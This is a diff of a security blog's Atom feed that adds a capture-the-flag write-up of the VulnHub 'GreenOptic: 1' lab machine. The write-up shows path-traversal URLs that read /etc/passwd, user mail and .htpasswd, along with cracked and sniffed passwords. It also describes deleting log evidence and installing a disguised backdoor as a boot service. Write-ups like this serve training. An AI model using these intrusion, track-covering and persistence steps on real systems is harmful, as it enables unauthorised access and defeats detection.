@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-03-27T16:17:49-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Nihaal Prasad</title><subtitle></subtitle><entry><title type="html">Creating a Barebones Windows Debugger</title><link href="http://localhost:4000/2020/03/27/creating-a-barebones-windows-debugger.html" rel="alternate" type="text/html" title="Creating a Barebones Windows Debugger" /><published>2020-03-27T00:00:00-04:00</published><updated>2020-03-27T00:00:00-04:00</updated><id>http://localhost:4000/2020/03/27/creating-a-barebones-windows-debugger</id><content type="html" xml:base="http://localhost:4000/2020/03/27/creating-a-barebones-windows-debugger.html">&lt;p&gt;Today, I will be showing how I created a basic debugger in C for Windows programs. This will be very similar to the &lt;a href=&quot;https://nihaal-prasad.github.io/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;Linux Debugger&lt;/a&gt; that I made a while back, but will be quite different because I will be using the Windows debugging API as opposed to the Linux one.&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-07-23T18:52:03-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Nihaal Prasad</title><subtitle></subtitle><entry><title type="html">Creating a Barebones Windows Debugger</title><link href="http://localhost:4000/2020/03/27/creating-a-barebones-windows-debugger.html" rel="alternate" type="text/html" title="Creating a Barebones Windows Debugger" /><published>2020-03-27T00:00:00-04:00</published><updated>2020-03-27T00:00:00-04:00</updated><id>http://localhost:4000/2020/03/27/creating-a-barebones-windows-debugger</id><content type="html" xml:base="http://localhost:4000/2020/03/27/creating-a-barebones-windows-debugger.html">&lt;p&gt;Today, I will be showing how I created a basic debugger in C for Windows programs. This will be very similar to the &lt;a href=&quot;https://nihaal-prasad.github.io/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;Linux Debugger&lt;/a&gt; that I made a while back, but will be quite different because I will be using the Windows debugging API as opposed to the Linux one.&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;static PROCESS_INFORMATION pi = {0}; // Contains information about the debugged process
 static int dwContinueStatus = DBG_CONTINUE; // The status for continuing execution
@@ -354,6 +354,12 @@ void ReadMemory(char *addr_hex, int n) {
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/03/27/pentesting-greenoptic-1.html&quot;&gt;
+          Pentesting GreenOptic: 1
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;
           Creating a Barebones Linux Debugger
         &lt;/a&gt;
@@ -365,14 +371,147 @@ void ReadMemory(char *addr_hex, int n) {
         &lt;/a&gt;
       &lt;/li&gt;
     
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/02/22/reversing-buildString-program.html&quot;&gt;
-          Reversing the buildString CTF challenge
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
   &lt;/ul&gt;
-&lt;/section&gt;</content><author><name></name></author><summary type="html">Today, I will be showing how I created a basic debugger in C for Windows programs. This will be very similar to the Linux Debugger that I made a while back, but will be quite different because I will be using the Windows debugging API as opposed to the Linux one.</summary></entry><entry><title type="html">Creating a Barebones Linux Debugger</title><link href="http://localhost:4000/2020/03/07/creating-a-barebones-linux-debugger.html" rel="alternate" type="text/html" title="Creating a Barebones Linux Debugger" /><published>2020-03-07T00:00:00-05:00</published><updated>2020-03-07T00:00:00-05:00</updated><id>http://localhost:4000/2020/03/07/creating-a-barebones-linux-debugger</id><content type="html" xml:base="http://localhost:4000/2020/03/07/creating-a-barebones-linux-debugger.html">&lt;p&gt;Today, I will be showing how I created a basic debugger in C for Linux programs. This won’t be a very complicated debugger as it will only allow you to do three things: see the values of the registers, step through one instruction, and read hex values from memory. Obviously, this is nothing compared to something like IDA Pro, but making a basic debugger did help me understand what the debugger is actually doing when we are using it.&lt;/p&gt;
+&lt;/section&gt;</content><author><name></name></author><summary type="html">Today, I will be showing how I created a basic debugger in C for Windows programs. This will be very similar to the Linux Debugger that I made a while back, but will be quite different because I will be using the Windows debugging API as opposed to the Linux one.</summary></entry><entry><title type="html">Pentesting GreenOptic: 1</title><link href="http://localhost:4000/2020/03/27/pentesting-greenoptic-1.html" rel="alternate" type="text/html" title="Pentesting GreenOptic: 1" /><published>2020-03-27T00:00:00-04:00</published><updated>2020-03-27T00:00:00-04:00</updated><id>http://localhost:4000/2020/03/27/pentesting-greenoptic-1</id><content type="html" xml:base="http://localhost:4000/2020/03/27/pentesting-greenoptic-1.html">&lt;p&gt;Today, I will be writing up how I solved the &lt;a href=&quot;https://www.vulnhub.com/entry/greenoptic-1,510/#&quot;&gt;GreenOptic: 1&lt;/a&gt; challenge from VulnHub. This was quite a difficult box to do as it led me down a bunch of rabbit-holes, but nonetheless, I was able to solve it. The challenge was designed to be realistic, and all of the things that I came across were things that could be found in a real environment.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image18.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As soon as I downloaded the virtual machine and spun it up in &lt;a href=&quot;https://www.virtualbox.org/&quot;&gt;VirtualBox&lt;/a&gt;, I immediately noticed that the target’s hostname was “websrv01” and it was running CentOS Linux 7. I ran a ping scan in Nmap to find out that the IP address of the virtual machine was 192.168.56.19, and afterwards, I ran an aggressive SYN scan as well (shown below). Ports 21/tcp, 22/tcp, 53/tcp, 80/tcp, and 10000/tcp were open. I tried to login to the FTP server using the anonymous account, but it did not work.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image30.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The webpage running on port 10000 intrigued me because it is typically not a port used for HTTP, so I went ahead and looked at it. There was a login page for &lt;a href=&quot;http://www.webmin.com/&quot;&gt;Webmin&lt;/a&gt;, which is a web-based interface for Unix system administration.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image26.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I tried to use all of the most obvious passwords (such as admin/admin, root/root, etc.), but after I typed in an incorrect password too many times, the server automatically blocked my IP address. This meant that brute forcing the webpage was not an option. Webmin 1.953 is the latest version of Webmin (at the time of writing this), and no known vulnerabilities existed in its environment. After trying a few more different things, I decided that this was probably not the best attack vector, and I moved on.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image22.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;There was another basic webpage running on port 80, so I decided to take a look at that as well. At first glance, it did not seem very interesting. However, using gobuster, I was able to brute force some hidden directories in the website, and I found a hidden login page at /account/.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image14.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Once again, I tried to use the most obvious passwords, but I had no luck. I moved on and looked more into the website, where I found a directory listing under /img. In the directory listing, I saw two peculiar files: image.dd and testdisk.log. What was a log file and a disk image file doing in a directory filled with pictures?&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image37.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I downloaded both the files. The &lt;code class=&quot;highlighter-rouge&quot;&gt;file image.dd&lt;/code&gt; command indicated that image.dd was a BTRFS filesystem image, but I got an error when I tried to use btrfs to look at the file.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image13.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I took a look at the testdisk.log file as well. This file was a log for a data recovery utility called TestDisk.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image29.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I found &lt;a href=&quot;https://www.cgsecurity.org/wiki/TestDisk&quot;&gt;this&lt;/a&gt; off of Google, which seemed to be the same program referenced in the log file, and I used it on the image file.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image24.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I spent a few hours looking trying to use the TestDisk program to extract the files from the disk image file, but I had no luck. I tried to change every single setting, including the partition table type, the sector size, the number of cylinders, and the number of heads, but it appeared as though no matter what I did, I was unable to extract any useful information from the image file. As it turns out, this was a rabbit hole.&lt;/p&gt;
+
+&lt;p&gt;I backtracked a little bit and went back to the login page I found in the /account directory. I noticed that there was an “include” parameter in the URL, and modifying the value of this include parameter could change what was shown on the website. By travelling to http://192.168.56.19/account/index.php?include=../../../../../../../../etc/passwd, I was able to read the contents of /etc/passwd. Using this file, I discovered three new usernames: sam, terry, and alex.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image3.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Suddenly, I had an idea: what if I tried to read the emails of the three users that I just found? Going to http://192.168.56.19/account/index.php?include=../../../../../../../../var/mail/terry allowed me to see terry’s emails, which included the following password: wsllsa!2&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image9.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Using the same idea, I was able to read sam’s email as well from http://192.168.56.19/account/index.php?include=../../../../../../../../var/mail/sam. Sam’s email included the following password: HelloSunshine123&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image6.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I was unable to read alex’s emails (or perhaps he didn’t have any emails). I tried to use the usernames and passwords that I acquired in every login page that I saw earlier, but none of them worked. I couldn’t read /etc/shadow using the LFI, even after I tried common tricks like putting a NULL byte at the end or base64 encoding it. I spun up a web server on my host machine and attempted to exploit an &lt;a href=&quot;https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/&quot;&gt;RFI vulnerability&lt;/a&gt;, but I was also unsuccessful at doing this as the website only allowed local files to be included. Since that didn’t work, I tried to see if I could use a &lt;a href=&quot;https://www.idontplaydarts.com/2011/03/php-remote-file-inclusion-command-shell-using-data-stream/&quot;&gt;data stream&lt;/a&gt; to execute PHP code, but that also did not work. I even tried to send an email containing PHP code to terry and sam so that I could potentially read it using the LFI and gain code execution, but something was blocking my emails from being sent.&lt;/p&gt;
+
+&lt;p&gt;At this point, I was hours into doing this challenge, and I was hitting a wall. I wasn’t getting anywhere, so I messaged the challenge writer on discord telling him what I’ve done so far, and he sent me this back:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Have you looked at the DNS server and tried enumerating subdomains? :)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Unfortunately, I had gotten so caught up with searching for vulnerabilities in the web servers that I had forgot to do some initial enumeration with the DNS server! Looking back, this was something incredibly obvious that I had missed, and there are no excuses for making such a basic enumeration mistake.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image33.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After doing the zone transfer, I had to add greenoptic.vm, websrv01.greenoptic.vm, root.greenoptic.vm, ns1.greenoptic.vm, and recoveryplan.greenoptic.vm to my hosts file. When I travelled to http://greenoptic.vm, http://websrv01.greentoptic.vm, http://root.greenoptic.vm, and http://ns1.greenoptic.vm, I was greeted with the same website as I saw before. However, when I travelled to http://recoveryplan.greenoptic.vm, I saw something different.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image20.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The website required credentials in order to view the webpage. Perhaps there was an .htpasswd file located somewhere?&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image38.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Using the LFI vulnerability that I found earlier, I was able to see a password hash for a user named “staff” in /var/www/.htpasswd. This hash was easy to brute force using john.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image35.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Using the username “staff” and the password “wheeler”, I was able to access the webpage at http://recoveryplan.greenoptic.vm. This website contained a phpBB forum that allowed staff members to post information about their company.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image34.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I clicked on the “Team Message” post made by terry. In his post, terry attached a file called “dpi.zip,” which contained a password-protected PCAP file. I was able to extract the PCAP file by using a password found earlier: HelloSunshine123&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image11.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I scrolled through the PCAP file in wireshark, and I eventually found cleartext FTP credentials for alex. His password was FewjAASD1.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image17.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After logging into alex’s FTP account, I found one file named “user.txt” in the current directory. This file did not contain any useful information aside from a motivational message that let me know that I was on the right track.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image1.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I went back onto the website and registered a user named “notahacker” using the registration form. I had to use sam@websrv01.greenoptic.vm (which I saw earlier) as the email address because the email was required to be in the greenoptic.vm domain.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image5.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After creating the account, I was able to create a new post on phpBB that was subtly titled “I’m definitely not a hacker. Just ignore this please.” I included PHP code in the body of the post, thinking that it would allow me to gain code execution on the target machine.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image31.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;However, the website informed me that my post would not be uploaded until I had a moderator approve it.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image16.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I logged into phpBB as terry using “wsllsa!2” as the password. Since terry was a moderator, I was able to approve the post that I had created. Unfortunately, this did not give me any code execution, and I ended up just deleting the page. I scoured the moderator’s settings page, hoping that I could find some setting that could lead me to code execution. It took me a while to realize that I was wasting my time in another rabbit-hole; the FTP credentials that I found earlier also worked for SSH, which gave me a low-priv shell as alex!&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image41.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I setup a web server on my host machine that allowed me to easily transfer files to the target machine using wget. After doing some digging and using a few enumeration scripts, I noticed that alex was part of the wireshark group.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image10.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This was interesting to me, so I executed tshark (wireshark’s command line equivalent) to look at the packets being sent.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image8.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;One of the messages in the packet capture contained “AHJvb3QAQVNmb2pvajJlb3p4Y3p6bWVkbG1lZEFTQVNES29qM28=”, which was base64 decoded as “rootASfojoj2eozxczzmedlmedASASDKoj3o”. Using “ASfojoj2eozxczzmedlmedASASDKoj3o” as the password for root allowed me to obtain root privileges.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image19.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The next step was to cover the tracks that I had left while doing the pentest. I went into /var/mail/sam, and I deleted the email that indicated that I created an account on the web server using his email.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image7.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I had used a few privilege escalation checkers while searching for attack vectors, so I had to delete those from /tmp.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image2.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I had also tried using “sudo” several times while I was logged in as alex, which caused me to receive messages saying something along the lines of “alex is not in the sudoers group. This incident will be reported.” I had to delete these incident reports from /var/mail/root.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image27.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The last step was to make sure that I could retain access to the machine even if the root password was changed for some reason. I wanted to test out the &lt;a href=&quot;https://github.com/nihaal-prasad/Basic-Linux-Backdoor&quot;&gt;backdoor&lt;/a&gt; that I recently created, so I transferred it to the target machine using wget. I also renamed the file from “backdoor_server” to “updates” to make it seem less suspicious.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image32.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I created a new service called /etc/systemd/system/update.service that would always execute /.update on boot.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image23.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Finally, I was able to retain access to the target even if it was rebooted and the root user’s password was changed.&lt;/p&gt;
+
+&lt;p&gt;&lt;img style=&quot;margin-left: auto; margin-right: auto;&quot; src=&quot;../../../assets/img/2020-7-21-pentesting-greenoptic-1/image25.png&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Today, I will be writing up how I solved the GreenOptic: 1 challenge from VulnHub. This was quite a difficult box to do as it led me down a bunch of rabbit-holes, but nonetheless, I was able to solve it. The challenge was designed to be realistic, and all of the things that I came across were things that could be found in a real environment.</summary></entry><entry><title type="html">Creating a Barebones Linux Debugger</title><link href="http://localhost:4000/2020/03/07/creating-a-barebones-linux-debugger.html" rel="alternate" type="text/html" title="Creating a Barebones Linux Debugger" /><published>2020-03-07T00:00:00-05:00</published><updated>2020-03-07T00:00:00-05:00</updated><id>http://localhost:4000/2020/03/07/creating-a-barebones-linux-debugger</id><content type="html" xml:base="http://localhost:4000/2020/03/07/creating-a-barebones-linux-debugger.html">&lt;p&gt;Today, I will be showing how I created a basic debugger in C for Linux programs. This won’t be a very complicated debugger as it will only allow you to do three things: see the values of the registers, step through one instruction, and read hex values from memory. Obviously, this is nothing compared to something like IDA Pro, but making a basic debugger did help me understand what the debugger is actually doing when we are using it.&lt;/p&gt;
 
 &lt;p&gt;The first thing that we need to do is to run the program we want to debug in a separate process using fork(). The program’s name will be given as a command line argument to our debugger, and any additional arguments that we want to past to the program we are currently debugging can also be passed as arguments. Once we call fork() to make a copy of this process, we will make the child process call &lt;code class=&quot;highlighter-rouge&quot;&gt;ptrace(PTRACE_TRACEME, 0, 0, 0);&lt;/code&gt;, which will let the child process know that it is going to be debugged by the parent process. The &lt;code class=&quot;highlighter-rouge&quot;&gt;ptrace()&lt;/code&gt; function will be used throughout our code as it allows the parent process to control and observe the child process. From there, we will use execv() to actually execute the program that we want to execute. As soon as this happens, the tracee (the program being debugged) stop pause execution on a SIGTRAP, which will be used to prevent the tracee from executing any more code unless the tracer/debugger allows it.&lt;/p&gt;
 
@@ -562,6 +701,12 @@ r15 0x0
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/03/27/pentesting-greenoptic-1.html&quot;&gt;
+          Pentesting GreenOptic: 1
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
           Creating a Barebones Windows Debugger
         &lt;/a&gt;
@@ -570,12 +715,6 @@ r15 0x0
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/02/27/cracking-Silva97-login-cipher.html&quot;&gt;
           Cracking Silva97's login-cipher
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/02/22/reversing-buildString-program.html&quot;&gt;
-          Reversing the buildString CTF challenge
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -621,6 +760,12 @@ r15 0x0
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/03/27/pentesting-greenoptic-1.html&quot;&gt;
+          Pentesting GreenOptic: 1
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
           Creating a Barebones Windows Debugger
         &lt;/a&gt;
@@ -629,12 +774,6 @@ r15 0x0
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;
           Creating a Barebones Linux Debugger
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/02/22/reversing-buildString-program.html&quot;&gt;
-          Reversing the buildString CTF challenge
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -664,6 +803,12 @@ r15 0x0
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/03/27/pentesting-greenoptic-1.html&quot;&gt;
+          Pentesting GreenOptic: 1
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
           Creating a Barebones Windows Debugger
         &lt;/a&gt;
@@ -672,12 +817,6 @@ r15 0x0
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;
           Creating a Barebones Linux Debugger
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/02/27/cracking-Silva97-login-cipher.html&quot;&gt;
-          Cracking Silva97's login-cipher
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -731,6 +870,12 @@ c7(): rax = 0x22
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/03/27/pentesting-greenoptic-1.html&quot;&gt;
+          Pentesting GreenOptic: 1
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
           Creating a Barebones Windows Debugger
         &lt;/a&gt;
@@ -739,12 +884,6 @@ c7(): rax = 0x22
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;
           Creating a Barebones Linux Debugger
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/02/27/cracking-Silva97-login-cipher.html&quot;&gt;
-          Cracking Silva97's login-cipher
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1264,6 +1403,12 @@ exploit
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/03/27/pentesting-greenoptic-1.html&quot;&gt;
+          Pentesting GreenOptic: 1
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
           Creating a Barebones Windows Debugger
         &lt;/a&gt;
@@ -1272,12 +1417,6 @@ exploit
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;
           Creating a Barebones Linux Debugger
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/02/27/cracking-Silva97-login-cipher.html&quot;&gt;
-          Cracking Silva97's login-cipher
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1443,6 +1582,12 @@ optional arguments:
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
+        &lt;a href=&quot;/2020/03/27/pentesting-greenoptic-1.html&quot;&gt;
+          Pentesting GreenOptic: 1
+        &lt;/a&gt;
+      &lt;/li&gt;
+    
+      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
           Creating a Barebones Windows Debugger
         &lt;/a&gt;
@@ -1451,12 +1596,6 @@ optional arguments:
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
         &lt;a href=&quot;/2020/03/07/creating-a-barebones-linux-debugger.html&quot;&gt;
           Creating a Barebones Linux Debugger
-        &lt;/a&gt;
-      &lt;/li&gt;
-    
-      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/02/27/cracking-Silva97-login-cipher.html&quot;&gt;
-          Cracking Silva97's login-cipher
         &lt;/a&gt;
       &lt;/li&gt;
     
@@ -1552,124 +1691,10 @@ flag is flag{!#&amp;amp;*/5&amp;lt;DMW}
   &lt;ul class=&quot;post-list&quot;&gt;
     
       &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
-        &lt;a href=&quot;/2020/03/27/creating-a-barebones-windows-debugger.html&quot;&gt;
-          Creating a Barebones Windows Debugger
+        &lt;a href=&quot;/2020/03/27/pentesting-greenoptic-1.html&quot;&gt;
+          Pentesting GreenOptic: 1
